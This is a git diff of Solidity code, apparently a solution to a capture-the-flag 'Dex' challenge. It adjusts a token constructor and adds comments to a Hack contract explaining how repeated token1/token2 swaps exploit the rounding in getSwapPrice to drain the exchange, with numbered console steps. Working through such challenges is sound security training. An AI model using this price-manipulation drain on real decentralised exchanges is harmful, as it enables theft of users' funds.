@@ -66,9 +66,7 @@ contract Dex is Ownable {
 contract SwappableToken is ERC20 {
   address private _dex;
   constructor(address dexInstance ) ERC20("name", "symbol") {
-        _mint(msg.sender, 10000);
-        approve(msg.sender, 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,10);
-        transfer(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2,10);
+        _mint(msg.sender, 110);
         _dex = dexInstance;
   }
 
@@ -78,6 +76,8 @@ contract SwappableToken is ERC20 {
     return true;
   }
 }
+
+
 
 
 interface DexI {
@@ -103,7 +103,8 @@ contract Hack {
 
   function hack() public {
     // Approve Dex to transfer lot of tokens
-    // Keep swapping between token1 and token2 with less than total amount. 
+    // Keep swapping between token1 and token2 with less than total amount. The maths of getSwapPrice can return greater token than the balance 
+    // and because there's no check before that transferFrom call is executed
     // 1. await contract.approve(await contract.address, 1000);
     // 2. await contract.swap(await contract.token2(), await contract.token1(), 5);
     // 3. await contract.swap(await contract.token1(), await contract.token2(), 5);
